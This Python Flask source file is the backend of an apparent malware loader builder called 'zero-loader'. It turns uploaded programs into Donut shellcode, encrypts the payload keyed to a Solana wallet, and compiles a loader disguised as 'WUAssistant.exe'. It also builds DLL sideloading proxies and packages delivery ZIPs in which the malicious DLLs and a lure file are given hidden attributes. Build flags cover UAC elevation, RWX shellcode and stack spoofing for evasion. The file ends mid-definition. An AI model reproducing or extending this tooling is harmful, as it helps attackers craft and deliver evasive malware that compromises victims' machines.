"""
zero-loader web UI backend (Flask, single-file).
*** LOCAL-USE ONLY *** Binds to 127.0.0.1.

Storage layout
──────────────
web/data/profiles.json           ← build profiles only
web/workspace/donut/<id>/        ← donut job: meta.json + original file + shellcode.bin
web/workspace/solana/<id>/       ← wallet:    meta.json + keypair.json
web/workspace/encrypt/<id>/      ← encrypt run: meta.json + Payload.h + key.txt + data.enc
web/workspace/builds/<id>/       ← build run:   meta.json + output.txt + <binary>
"""
from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import time
import uuid
import zipfile
from pathlib import Path

from flask import Flask, Response, jsonify, request, send_file, send_from_directory

PROJECT_ROOT   = Path(__file__).resolve().parent.parent
WEB_DIR        = Path(__file__).resolve().parent
STATIC_DIR     = WEB_DIR / "static"
WORKSPACE      = WEB_DIR / "workspace"
DATA_DIR       = WEB_DIR / "data"
WALLETS_DIR         = WORKSPACE / "solana"    # each subdir: meta.json + keypair.json
DONUT_DIR           = WORKSPACE / "donut"     # each subdir: meta.json + files
ENCRYPT_HISTORY_DIR = WORKSPACE / "encrypt"  # each subdir: meta.json + Payload.h + key.txt + data.enc
BUILD_HISTORY_DIR   = WORKSPACE / "builds"   # each subdir: meta.json + output.txt + binary (+ zip for sideload)
DLLS_DIR            = WORKSPACE / "dlls"     # each subdir: meta.json + the DLL file
EXES_DIR            = WORKSPACE / "exes"     # each subdir: meta.json + the EXE file
BINDS_DIR           = WORKSPACE / "binds"    # each subdir: meta.json + the bind/lure file
PROFILES_FILE  = DATA_DIR / "profiles.json"
SOLANA_DIR     = PROJECT_ROOT / "solana"
DONUT_EXE      = PROJECT_ROOT / "donut" / "donut.exe"

for _d in (WORKSPACE, DATA_DIR, WALLETS_DIR, DONUT_DIR, ENCRYPT_HISTORY_DIR, BUILD_HISTORY_DIR, DLLS_DIR, EXES_DIR, BINDS_DIR):
    _d.mkdir(parents=True, exist_ok=True)

app = Flask(__name__, static_folder=str(STATIC_DIR), static_url_path="")

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

SAFE_NAME_RE = re.compile(r"^[A-Za-z0-9._-]+$")
_B58_RE      = re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')
_ID_RE       = re.compile(r'^[a-f0-9]{8}$')


def _safe_name(name: str) -> str | None:
    if not name or ".." in name:
        return None
    base = os.path.basename(name)
    return base if SAFE_NAME_RE.match(base) else None


def _new_id() -> str:
    return uuid.uuid4().hex[:8]


# ── Profiles (only thing stored in data/) ────────────────────────────────

def _load_profiles() -> list:
    if PROFILES_FILE.is_file():
        try:
            return json.loads(PROFILES_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return []


def _save_profiles(profiles: list) -> None:
    PROFILES_FILE.write_text(
        json.dumps(profiles, indent=2, ensure_ascii=False), encoding="utf-8"
    )


# ── Wallets (meta.json per wallet dir) ────────────────────────────────────

def _load_wallets() -> list:
    wallets: list[dict] = []
    if WALLETS_DIR.is_dir():
        for d in WALLETS_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        wallets.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(wallets, key=lambda w: -w.get("created_at", 0))


def _find_wallet(wid: str) -> dict | None:
    mf = WALLETS_DIR / wid / "meta.json"
    if mf.is_file():
        try:
            return json.loads(mf.read_text(encoding="utf-8"))
        except Exception:
            pass
    return None


def _save_wallet_meta(meta: dict) -> None:
    wdir = WALLETS_DIR / meta["id"]
    wdir.mkdir(parents=True, exist_ok=True)
    (wdir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")


# ── Donut jobs (meta.json per job dir) ────────────────────────────────────

def _load_donut_jobs() -> list:
    jobs: list[dict] = []
    if DONUT_DIR.is_dir():
        for d in DONUT_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        jobs.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(jobs, key=lambda j: -j.get("created_at", 0))


# ── Encrypt / Build history ───────────────────────────────────────────────

def _load_encrypt_history() -> list:
    jobs: list[dict] = []
    if ENCRYPT_HISTORY_DIR.is_dir():
        for d in ENCRYPT_HISTORY_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        jobs.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(jobs, key=lambda j: -j.get("created_at", 0))


def _load_build_history() -> list:
    jobs: list[dict] = []
    if BUILD_HISTORY_DIR.is_dir():
        for d in BUILD_HISTORY_DIR.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        jobs.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(jobs, key=lambda j: -j.get("created_at", 0))


# ── DLL / EXE workspace ───────────────────────────────────────────────────

def _load_asset_dir(base: Path) -> list:
    items: list[dict] = []
    if base.is_dir():
        for d in base.iterdir():
            if d.is_dir():
                mf = d / "meta.json"
                if mf.is_file():
                    try:
                        items.append(json.loads(mf.read_text(encoding="utf-8")))
                    except Exception:
                        pass
    return sorted(items, key=lambda x: -x.get("created_at", 0))


def _load_dlls() -> list:
    return _load_asset_dir(DLLS_DIR)


def _load_exes() -> list:
    return _load_asset_dir(EXES_DIR)


def _load_binds() -> list:
    return _load_asset_dir(BINDS_DIR)


def _find_asset(base: Path, aid: str) -> dict | None:
    mf = base / aid / "meta.json"
    if mf.is_file():
        try:
            return json.loads(mf.read_text(encoding="utf-8"))
        except Exception:
            pass
    return None


def _upload_asset(base: Path, upload, label: str) -> dict:
    """Save an uploaded file to base/<new_id>/. Returns meta dict."""
    name = _safe_name(upload.filename or label) or label
    aid  = _new_id()
    adir = base / aid
    adir.mkdir(parents=True, exist_ok=True)
    fpath = adir / name
    upload.save(str(fpath))
    meta = {
        "id":         aid,
        "name":       name,
        "size":       fpath.stat().st_size,
        "created_at": int(time.time()),
    }
    (adir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    return meta


def _cleanup_build_artifacts(binary_name: str | None = None) -> None:
    """Remove build intermediates, logs, and the output binary from PROJECT_ROOT.

    Called after every build (success or failure) so the working tree stays
    clean between runs.  Payload.h and source files are never touched.
    """
    # Compiler intermediates (build.bat removes most of these, but be thorough)
    for pat in ("*.obj", "*.exp", "*.lib", "*.res"):
        for f in PROJECT_ROOT.glob(pat):
            try:
                f.unlink()
            except Exception:
                pass
    # Debug / build log files
    for pat in ("*.log",):
        for f in PROJECT_ROOT.glob(pat):
            try:
                f.unlink()
            except Exception:
                pass
    # Output binary (already copied to workspace/builds/<id>/ on success)
    if binary_name:
        safe = _safe_name(binary_name)
        if safe:
            b = PROJECT_ROOT / safe
            if b.is_file() and b.suffix.lower() in (".exe", ".dll"):
                try:
                    b.unlink()
                except Exception:
                    pass
    # Generated header files (already archived in history on success)
    for fname in ("Payload.h", "Sideload.h", "Sideload.rc"):
        f = PROJECT_ROOT / fname
        if f.is_file():
            try:
                f.unlink()
            except Exception:
                pass


def _save_build_history(
    job_id: str, data: dict, mode: str, output_arg: str,
    returncode: int, output_text: str,
    zip_info: dict | None = None,
    sideload_h_size: int = 0,
) -> None:
    """Persist build run to workspace/builds/<id>/.
    zip_info: {"name": "<file>.zip", "size": N} — already written to hist_dir by caller.
    sideload_h_size: byte size of Sideload.h already copied to hist_dir (0 if absent).
    """
    ok          = (returncode == 0)
    binary_name = "WUAssistant.exe" if mode == "exe" else (output_arg if output_arg else "sideload.dll")

    hist_dir = BUILD_HISTORY_DIR / job_id
    hist_dir.mkdir(parents=True, exist_ok=True)

    meta: dict = {
        "id":             job_id,
        "created_at":     int(time.time()),
        "ok":             ok,
        "mode":           mode,
        "binary_name":    binary_name,
        "binary_size":    0,
        "uac":            bool(data.get("uac")),
        "rwx":            bool(data.get("rwx")),
        "debug":          bool(data.get("debug")),
        "synthetic":      bool(data.get("synthetic")),
        "zip_name":       zip_info.get("name") if zip_info else None,
        "zip_size":       zip_info.get("size", 0) if zip_info else 0,
        "sideload_h_size": sideload_h_size,
    }

    try:
        (hist_dir / "output.txt").write_text(output_text, encoding="utf-8", errors="replace")
    except Exception:
        pass

    binary_src = PROJECT_ROOT / binary_name
    if ok and binary_src.is_file():
        try:
            dest = hist_dir / binary_name
            shutil.copy2(str(binary_src), str(dest))
            meta["binary_size"] = dest.stat().st_size
        except Exception:
            pass

    try:
        (hist_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    except Exception:
        pass


# ── Subprocess runner ──────────────────────────────────────────────────────

def _run(argv: list[str], cwd: Path = PROJECT_ROOT) -> dict:
    try:
        proc = subprocess.run(argv, cwd=str(cwd), capture_output=True, text=True, timeout=120)
        return {"ok": proc.returncode == 0, "code": proc.returncode,
                "stdout": proc.stdout, "stderr": proc.stderr}
    except subprocess.TimeoutExpired as e:
        return {"ok": False, "code": -1, "stdout": e.stdout or "", "stderr": "timeout (120s)"}
    except FileNotFoundError as e:
        return {"ok": False, "code": -1, "stdout": "", "stderr": str(e)}


# ---------------------------------------------------------------------------
# Static
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return send_from_directory(STATIC_DIR, "index.html")


# ---------------------------------------------------------------------------
# Encrypt
# ---------------------------------------------------------------------------

@app.route("/api/encrypt", methods=["POST"])
def api_encrypt():
    # Wallet: from stored wallet ID or manual address input
    wallet_id  = (request.form.get("wallet_id") or "").strip()
    sol_wallet = (request.form.get("sol_wallet") or "").strip()
    if wallet_id and _ID_RE.match(wallet_id):
        wallet = _find_wallet(wallet_id)
        if wallet:
            sol_wallet = wallet["address"]
    if not sol_wallet or not _B58_RE.match(sol_wallet):
        return jsonify({"ok": False,
                        "stderr": "invalid Solana wallet (base58, 32–44 chars) — select from workspace or enter manually"}), 400

    # If wallet_id was not supplied via selector, try to resolve it from the address
    # so we can publish later without asking the user to pick again.
    if not wallet_id:
        for _w in _load_wallets():
            if _w.get("address") == sol_wallet:
                wallet_id = _w["id"]
                break

    # Shellcode: from Donut workspace job or direct file upload
    shellcode_job_id = (request.form.get("shellcode_job_id") or "").strip()
    donut_label = ""
    donut_original_name = ""
    if shellcode_job_id and _ID_RE.match(shellcode_job_id):
        sc_path = DONUT_DIR / shellcode_job_id / "shellcode.bin"
        if not sc_path.is_file():
            return jsonify({"ok": False,
                            "stderr": f"shellcode.bin not found for Donut job {shellcode_job_id}"}), 404
        dmf = DONUT_DIR / shellcode_job_id / "meta.json"
        if dmf.is_file():
            try:
                dmeta = json.loads(dmf.read_text(encoding="utf-8"))
                donut_label         = dmeta.get("label", "")
                donut_original_name = dmeta.get("original_name", "")
            except Exception:
                pass
    elif "shellcode" in request.files and request.files["shellcode"].filename:
        upload  = request.files["shellcode"]
        name    = _safe_name(upload.filename or "shellcode.bin") or "shellcode.bin"
        sc_path = WORKSPACE / name
        upload.save(str(sc_path))
    else:
        return jsonify({"ok": False,
                        "stderr": "shellcode source required — select a Donut job or upload a .bin file"}), 400

    argv = [sys.executable, "Encrypt.py", str(sc_path), "--sol-wallet", sol_wallet]
    result = _run(argv)

    payload_path = PROJECT_ROOT / "Payload.h"
    if payload_path.is_file():
        result["payload_preview"] = payload_path.read_text(errors="replace")[:4096]
        result["payload_bytes"]   = payload_path.stat().st_size
    key_path = PROJECT_ROOT / "key.txt"
    key_text = ""
    if key_path.is_file():
        key_text = key_path.read_text(errors="replace").strip()
        result["key"] = key_text

    # ── Persist to encrypt history ─────────────────────────────────────────
    job_id   = _new_id()
    hist_dir = ENCRYPT_HISTORY_DIR / job_id
    hist_dir.mkdir(parents=True, exist_ok=True)

    dat_name = "data.enc"
    dat_src  = PROJECT_ROOT / dat_name
    meta: dict = {
        "id":                  job_id,
        "created_at":          int(time.time()),
        "ok":                  result["ok"],
        "wallet":              sol_wallet,
        "wallet_id":           wallet_id,
        "shellcode":           sc_path.name,
        "shellcode_job_id":    shellcode_job_id,
        "donut_label":         donut_label,
        "donut_original_name": donut_original_name,
        "dat_name":            dat_name,
        "dat_size":            0,
        "payload_h_size":      0,
        "key":                 key_text,
    }
    if payload_path.is_file():
        try:
            shutil.copy2(str(payload_path), str(hist_dir / "Payload.h"))
            meta["payload_h_size"] = payload_path.stat().st_size
        except Exception:
            pass
    if key_path.is_file():
        try:
            shutil.copy2(str(key_path), str(hist_dir / "key.txt"))
        except Exception:
            pass
    if dat_src.is_file():
        try:
            shutil.copy2(str(dat_src), str(hist_dir / dat_name))
            meta["dat_size"] = dat_src.stat().st_size
        except Exception:
            pass
    try:
        (hist_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    except Exception:
        pass

    # Clean generated files from PROJECT_ROOT — they're now archived in history
    for _f in [payload_path, key_path, dat_src]:
        try:
            if _f.is_file():
                _f.unlink()
        except Exception:
            pass

    result["job_id"] = job_id
    return jsonify(result)


# ---------------------------------------------------------------------------
# Encrypt history
# ---------------------------------------------------------------------------

@app.route("/api/encrypt/history")
def api_encrypt_history_list():
    return jsonify(_load_encrypt_history())


@app.route("/api/encrypt/history/<jid>/download/<ftype>")
def api_encrypt_history_download(jid, ftype):
    if not _ID_RE.match(jid):
        return "invalid", 400
    job_dir = ENCRYPT_HISTORY_DIR / jid
    if not job_dir.is_dir():
        return "not found", 404

    if ftype == "payload_h":
        path, dl = job_dir / "Payload.h", "Payload.h"
    elif ftype == "dat":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        dat_name = json.loads(mf.read_text()).get("dat_name", "data.enc")
        safe = _safe_name(dat_name)
        if not safe:
            return "invalid", 400
        path, dl = job_dir / safe, safe
    else:
        return "invalid", 400

    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=dl)


@app.route("/api/encrypt/history/<jid>", methods=["DELETE"])
def api_encrypt_history_delete(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    jdir = ENCRYPT_HISTORY_DIR / jid
    if jdir.is_dir():
        shutil.rmtree(str(jdir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Sideload
# ---------------------------------------------------------------------------

@app.route("/api/sideload", methods=["POST"])
def api_sideload():
    if "dll" not in request.files:
        return jsonify({"ok": False, "stderr": "dll file missing"}), 400
    upload   = request.files["dll"]
    name     = _safe_name(upload.filename or "target.dll") or "target.dll"
    dll_path = WORKSPACE / name
    upload.save(str(dll_path))
    rename = (request.form.get("rename") or "").strip()
    exe    = (request.form.get("exe") or "").strip()
    argv   = [sys.executable, "SideloadGen.py", str(dll_path)]
    if rename:
        safe = _safe_name(rename)
        if not safe:
            return jsonify({"ok": False, "stderr": "invalid rename"}), 400
        argv += ["--rename", safe]
    if exe:
        safe = _safe_name(exe)
        if not safe:
            return jsonify({"ok": False, "stderr": "invalid exe"}), 400
        argv += ["--exe", safe]
    return jsonify(_run(argv))


# ---------------------------------------------------------------------------
# Build (streaming)
# ---------------------------------------------------------------------------

VALID_MODES = {"exe", "sideload"}


@app.route("/api/build", methods=["POST"])
def api_build():
    data  = request.get_json(force=True, silent=True) or {}
    mode  = data.get("mode", "exe")
    if mode not in VALID_MODES:
        return jsonify({"ok": False, "stderr": f"invalid mode: {mode}"}), 400
    uac    = bool(data.get("uac"))
    rwx    = bool(data.get("rwx"))
    debug  = bool(data.get("debug"))
    synth  = bool(data.get("synthetic"))

    # ── Payload.h: copy from encrypt history if requested ────────────────
    enc_hist_id = (data.get("encrypt_history_id") or "").strip()
    if enc_hist_id and _ID_RE.match(enc_hist_id):
        ph_src = ENCRYPT_HISTORY_DIR / enc_hist_id / "Payload.h"
        ph_dst = PROJECT_ROOT / "Payload.h"
        if ph_src.is_file():
            shutil.copy2(str(ph_src), str(ph_dst))

    # ── sideload-specific inputs ──────────────────────────────────────────
    dll_id          = (data.get("dll_id")          or "").strip()
    exe_id          = (data.get("exe_id")          or "").strip()
    sideload_rename = (data.get("sideload_rename") or "").strip()
    host_rename     = (data.get("host_rename")     or "").strip()
    zip_name        = (data.get("zip_name")        or "").strip()
    bind_id         = (data.get("bind_id")         or "").strip()
    bind_rename     = (data.get("bind_rename")     or "").strip()

    # Resolve sideload assets up-front (before streaming starts)
    dll_name = exe_name = ""
    dll_path_obj: Path | None = None
    exe_path_obj: Path | None = None

    if mode == "sideload":
        if not dll_id or not _ID_RE.match(dll_id):
            return jsonify({"ok": False, "stderr": "DLL must be selected from the Sideload workspace"}), 400
        if not exe_id or not _ID_RE.match(exe_id):
            return jsonify({"ok": False, "stderr": "Host EXE must be selected from the Sideload workspace"}), 400
        if not zip_name:
            return jsonify({"ok": False, "stderr": "ZIP output name is required for sideload builds"}), 400

        dll_meta = _find_asset(DLLS_DIR, dll_id)
        exe_meta = _find_asset(EXES_DIR, exe_id)
        if not dll_meta:
            return jsonify({"ok": False, "stderr": f"DLL {dll_id} not found in workspace"}), 404
        if not exe_meta:
            return jsonify({"ok": False, "stderr": f"EXE {exe_id} not found in workspace"}), 404

        dll_name     = dll_meta["name"]
        exe_name     = exe_meta["name"]
        dll_path_obj = DLLS_DIR / dll_id / dll_name
        exe_path_obj = EXES_DIR / exe_id / exe_name

        if not dll_path_obj.is_file():
            return jsonify({"ok": False, "stderr": f"DLL file missing for {dll_id}"}), 404
        if not exe_path_obj.is_file():
            return jsonify({"ok": False, "stderr": f"EXE file missing for {exe_id}"}), 404

    # Resolve optional bind file
    bind_name     = ""
    bind_path_obj: Path | None = None
    if bind_id and _ID_RE.match(bind_id):
        bind_meta = _find_asset(BINDS_DIR, bind_id)
        if bind_meta:
            bind_name     = bind_meta["name"]
            bind_path_obj = BINDS_DIR / bind_id / bind_name
            if not bind_path_obj.is_file():
                bind_path_obj = None  # silently skip if file is missing

    # safe ZIP filename
    safe_zip = ""
    if zip_name:
        raw      = zip_name if zip_name.lower().endswith(".zip") else zip_name + ".zip"
        safe_zip = _safe_name(raw) or "output.zip"

    env    = os.environ.copy()
    extras: list[str] = []
    if rwx:   extras.append("/DRWX_SHELLCODE")
    if debug: extras.append("/DDEBUG")
    if synth: extras.append("/DENABLE_SYNTHETIC_STACK")
    if extras:
        env["CFLAGS_EXTRA"] = " ".join(extras)

    job_id = _new_id()

    def stream():
        buf: list[str] = []
        zip_info: dict = {}

        if mode == "sideload":
            effective_output = dll_name   # proxy DLL gets the target DLL's name
            build_args = ["build.bat", "sideload", dll_name]
            sg_argv = [sys.executable, "SideloadGen.py", str(dll_path_obj),
                       "--exe", exe_name]
            if sideload_rename:
                sg_safe = _safe_name(sideload_rename)
                if sg_safe:
                    sg_argv += ["--rename", sg_safe]
        else:
            effective_output = "WUAssistant.exe"
            build_args = ["build.bat"]
            sg_argv = None

        if uac:
            build_args.append("uac")

        # Header
        header = ""
        if sg_argv:
            header += f"$ {' '.join(shlex.quote(a) for a in sg_argv)}\n"
        header += f"$ {' '.join(shlex.quote(a) for a in build_args)}\n"
        if extras:
            header += f"CFLAGS_EXTRA={' '.join(extras)}\n"
        header += "\n"
        yield header
        buf.append(header)

        # ── Step 1: SideloadGen.py (sideload only) ────────────────────────
        if sg_argv:
            msg = f"[*] Generating Sideload.h for {dll_name} …\n\n"
            yield msg; buf.append(msg)
            sg = _run(sg_argv)
            if sg["stdout"]: yield sg["stdout"]; buf.append(sg["stdout"])
            if sg["stderr"]: yield sg["stderr"]; buf.append(sg["stderr"])
            sg_exit = f"\n[SideloadGen exit {sg['code']}]\n\n"
            yield sg_exit; buf.append(sg_exit)
            if not sg["ok"]:
                _save_build_history(job_id, data, mode, effective_output, -1, "".join(buf))
                _cleanup_build_artifacts()
                return

        # ── Step 2: build.bat ─────────────────────────────────────────────
        returncode = -1
        try:
            proc = subprocess.Popen(build_args, cwd=str(PROJECT_ROOT), env=env,
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    bufsize=1, text=True, shell=True)
        except FileNotFoundError as e:
            err = f"[error] {e}\n"
            yield err; buf.append(err)
            _save_build_history(job_id, data, mode, effective_output, -1, "".join(buf))
            _cleanup_build_artifacts()
            return

        assert proc.stdout is not None
        try:
            for line in proc.stdout:
                yield line; buf.append(line)
        finally:
            proc.wait()
            returncode = proc.returncode
            ok         = (returncode == 0)
            exit_line  = f"\n[exit {returncode}]\n"
            yield exit_line; buf.append(exit_line)

            # ── Step 3: create delivery ZIP (sideload success only) ────────
            # Windows file attribute flags encoded in ZIP external_attr (high word)
            #   FILE_ATTRIBUTE_ARCHIVE  = 0x20
            #   FILE_ATTRIBUTE_HIDDEN   = 0x02
            #   FILE_ATTRIBUTE_DIRECTORY= 0x10
            _ATTR_HIDDEN_FILE = 0x20 | 0x02   # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE (MS-DOS lower 16 bits)
            _ATTR_HIDDEN_DIR  = 0x10 | 0x02   # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY

            def _zip_write_hidden(zf: zipfile.ZipFile, src: str, arc: str) -> None:
                """Write src into the ZIP as arc with Windows hidden+archive attr."""
                zi = zipfile.ZipInfo(arc)
                zi.compress_type    = zipfile.ZIP_DEFLATED
                zi.external_attr    = _ATTR_HIDDEN_FILE
                with open(src, "rb") as fh:
                    zf.writestr(zi, fh.read())

            if ok and mode == "sideload" and dll_path_obj and exe_path_obj and safe_zip:
                try:
                    hist_dir = BUILD_HISTORY_DIR / job_id
                    hist_dir.mkdir(parents=True, exist_ok=True)
                    zip_path = hist_dir / safe_zip

                    with zipfile.ZipFile(str(zip_path), "w", zipfile.ZIP_DEFLATED) as zf:
                        # 1. Built proxy DLL — hidden attribute
                        proxy = PROJECT_ROOT / dll_name
                        if proxy.is_file():
                            _zip_write_hidden(zf, str(proxy), dll_name)
                        # 2. Original DLL (renamed) — hidden attribute
                        orig_arc = sideload_rename if sideload_rename else (
                            Path(dll_name).stem + "_orig" + Path(dll_name).suffix)
                        if dll_path_obj.is_file():
                            _zip_write_hidden(zf, str(dll_path_obj), orig_arc)
                        # 3. Host EXE — normal attributes
                        if exe_path_obj.is_file():
                            zf.write(str(exe_path_obj), host_rename if host_rename else exe_name)
                        # 4. Bind file — placed inside hidden _\ folder
                        if bind_path_obj and bind_path_obj.is_file():
                            bind_arc_name = bind_rename if bind_rename else bind_name
                            safe_bind_arc = _safe_name(bind_arc_name) or bind_name
                            # Add hidden _\ directory entry
                            dir_zi = zipfile.ZipInfo("_/")
                            dir_zi.external_attr = _ATTR_HIDDEN_DIR
                            zf.writestr(dir_zi, b"")
                            # Add bind file inside it
                            bind_zi = zipfile.ZipInfo(f"_/{safe_bind_arc}")
                            bind_zi.compress_type = zipfile.ZIP_DEFLATED
                            bind_zi.external_attr = 0  # normal file — no hidden attr
                            with open(str(bind_path_obj), "rb") as fh:
                                zf.writestr(bind_zi, fh.read())

                    zip_size = zip_path.stat().st_size
                    zip_info = {"name": safe_zip, "size": zip_size}
                    zline = f"\n[+] ZIP: {safe_zip}  ({zip_size // 1024} KB)\n"
                    yield zline; buf.append(zline)
                except Exception as ze:
                    zline = f"\n[!] ZIP creation failed: {ze}\n"
                    yield zline; buf.append(zline)

            # ── Step 4: save Sideload.h (sideload success only) ───────────
            sideload_h_size = 0
            if ok and mode == "sideload":
                sh_src = PROJECT_ROOT / "Sideload.h"
                if sh_src.is_file():
                    try:
                        _hd = BUILD_HISTORY_DIR / job_id
                        _hd.mkdir(parents=True, exist_ok=True)
                        dest = _hd / "Sideload.h"
                        shutil.copy2(str(sh_src), str(dest))
                        sideload_h_size = dest.stat().st_size
                    except Exception:
                        pass

            _save_build_history(job_id, data, mode, effective_output, returncode,
                                "".join(buf), zip_info or None, sideload_h_size)
            _cleanup_build_artifacts(effective_output)

    return Response(stream(), mimetype="text/plain; charset=utf-8")


# ---------------------------------------------------------------------------
# Artifacts
# ---------------------------------------------------------------------------

@app.route("/api/artifacts")
def api_artifacts():
    seen: dict[str, dict] = {}
    for pat in ("*.exe", "*.dll"):
        for f in PROJECT_ROOT.glob(pat):
            if f.name not in seen:
                seen[f.name] = {"name": f.name, "size": f.stat().st_size,
                                 "mtime": int(f.stat().st_mtime)}
    return jsonify(sorted(seen.values(), key=lambda x: -x["mtime"]))


@app.route("/api/download/<name>")
def api_download(name):
    safe = _safe_name(name)
    if not safe:
        return "invalid", 400
    path = PROJECT_ROOT / safe
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=safe)


@app.route("/api/status")
def api_status():
    return jsonify({
        "payload_h":   (PROJECT_ROOT / "Payload.h").is_file(),
        "sideload_h":  (PROJECT_ROOT / "Sideload.h").is_file(),
        "sideload_rc": (PROJECT_ROOT / "Sideload.rc").is_file(),
    })


# ---------------------------------------------------------------------------
# Build history
# ---------------------------------------------------------------------------

@app.route("/api/build/history")
def api_build_history_list():
    return jsonify(_load_build_history())


@app.route("/api/build/history/<jid>/download/<ftype>")
def api_build_history_download(jid, ftype):
    if not _ID_RE.match(jid):
        return "invalid", 400
    job_dir = BUILD_HISTORY_DIR / jid
    if not job_dir.is_dir():
        return "not found", 404

    if ftype == "output":
        path, dl = job_dir / "output.txt", "build_output.txt"
    elif ftype == "binary":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        binary_name = json.loads(mf.read_text()).get("binary_name", "WUAssistant.exe")
        safe = _safe_name(binary_name)
        if not safe:
            return "invalid", 400
        path, dl = job_dir / safe, safe
    elif ftype == "zip":
        mf = job_dir / "meta.json"
        if not mf.is_file():
            return "not found", 404
        zip_name_val = json.loads(mf.read_text()).get("zip_name")
        if not zip_name_val:
            return "not found", 404
        safe = _safe_name(zip_name_val)
        if not safe:
            return "invalid", 400
        path, dl = job_dir / safe, safe
    elif ftype == "sideload_h":
        path, dl = job_dir / "Sideload.h", "Sideload.h"
    else:
        return "invalid", 400

    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=dl)


@app.route("/api/build/history/<jid>", methods=["DELETE"])
def api_build_history_delete(jid):
    if not _ID_RE.match(jid):
        return jsonify({"ok": False}), 400
    jdir = BUILD_HISTORY_DIR / jid
    if jdir.is_dir():
        shutil.rmtree(str(jdir), ignore_errors=True)
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Profiles  (web/data/profiles.json)
# type = "encrypt" | "build"   (legacy entries without type treated as "encrypt")
# ---------------------------------------------------------------------------

@app.route("/api/profiles/encrypt")
def api_profiles_encrypt_list():
    return jsonify([p for p in _load_profiles() if p.get("type", "encrypt") == "encrypt"])


@app.route("/api/profiles/encrypt", methods=["POST"])
def api_profiles_encrypt_create():
    data = request.get_json(force=True, silent=True) or {}
    profile = {
        "id":               _new_id(),
        "type":             "encrypt",
        "name":             (data.get("name") or "Unnamed").strip(),
        "sol_wallet":       data.get("sol_wallet", ""),
        "shellcode_job_id": data.get("shellcode_job_id", ""),
        "created_at":       int(time.time()),
    }
    profiles = _load_profiles()
    profiles.insert(0, profile)
    _save_profiles(profiles)
    return jsonify({"ok": True, "profile": profile})


@app.route("/api/profiles/build")
def api_profiles_build_list():
    return jsonify([p for p in _load_profiles() if p.get("type") == "build"])


@app.route("/api/profiles/build", methods=["POST"])
def api_profiles_build_create():
    data = request.get_json(force=True, silent=True) or {}
    profile = {
        "id":                  _new_id(),
        "type":                "build",
        "name":                (data.get("name") or "Unnamed").strip(),
        "encrypt_history_id":  data.get("encrypt_history_id", ""),
        "dll_id":              data.get("dll_id", ""),
        "exe_id":              data.get("exe_id", ""),
        "sideload_rename":     data.get("sideload_rename", ""),
        "host_rename":         data.get("host_rename", ""),
        "zip_name":            data.get("zip_name", ""),
        "bind_id":             data.get("bind_id", ""),
        "bind_rename":         data.get("bind_rename", ""),
        "mode":                data.get("mode", "exe"),
        "uac":                 bool(data.get("uac")),
        "rwx":                 bool(data.get("rwx")),
        "debug":               bool(data.get("debug")),
        "synthetic":           bool(data.get("synthetic")),
        "created_at":          int(time.time()),
    }
    profiles = _load_profiles()
    profiles.insert(0, profile)
    _save_profiles(profiles)
    return jsonify({"ok": True, "profile": profile})


@app.route("/api/profiles/<pid>", methods=["PUT"])
def api_profiles_update(pid):
    if not _ID_RE.match(pid):
        return jsonify({"ok": False}), 400
    data = request.get_json(force=True, silent=True) or {}
    profiles = _load_profiles()
    idx = next((i for i, p in enumerate(profiles) if p["id"] == pid), None)
    if idx is None:
        return jsonify({"ok": False, "error": "not found"}), 404
    existing = profiles[idx]
    ptype = existing.get("type", "encrypt")
    update = {"name": (data.get("name") or existing["name"]).strip(), "updated_at": int(time.time())}
    if ptype == "encrypt":
        update.update({
            "sol_wallet":       data.get("sol_wallet",       existing.get("sol_wallet", "")),
            "shellcode_job_id": data.get("shellcode_job_id", existing.get("shellcode_job_id", "")),
        })
    else:
        update.update({
            "encrypt_history_id": data.get("encrypt_history_id", existing.get("encrypt_history_id", "")),
            "dll_id":             data.get("dll_id",          existing.get("dll_id", "")),
            "exe_id":             data.get("exe_id",          existing.get("exe_id", "")),
            "sideload_rename":    data.get("sideload_rename", existing.get("sideload_rename", "")),
            "host_rename":        data.get("host_rename",     existing.get("host_rename", "")),
            "zip_name":           data.get("zip_name",        existing.get("zip_name", "")),
            "bind_id":            data.get("bind_id",         existing.get("bind_id", "")),
            "bind_rename":        data.get("bind_rename",     existing.get("bind_rename", "")),
            "mode":               data.get("mode",            existing.get("mode", "exe")),
            "uac":                bool(data.get("uac")),
            "rwx":                bool(data.get("rwx")),
            "debug":              bool(data.get("debug")),
            "synthetic":          bool(data.get("synthetic")),
        })
    existing.update(update)
    profiles[idx] = existing
    _save_profiles(profiles)
    return jsonify({"ok": True, "profile": existing})


@app.route("/api/profiles/<pid>", methods=["DELETE"])
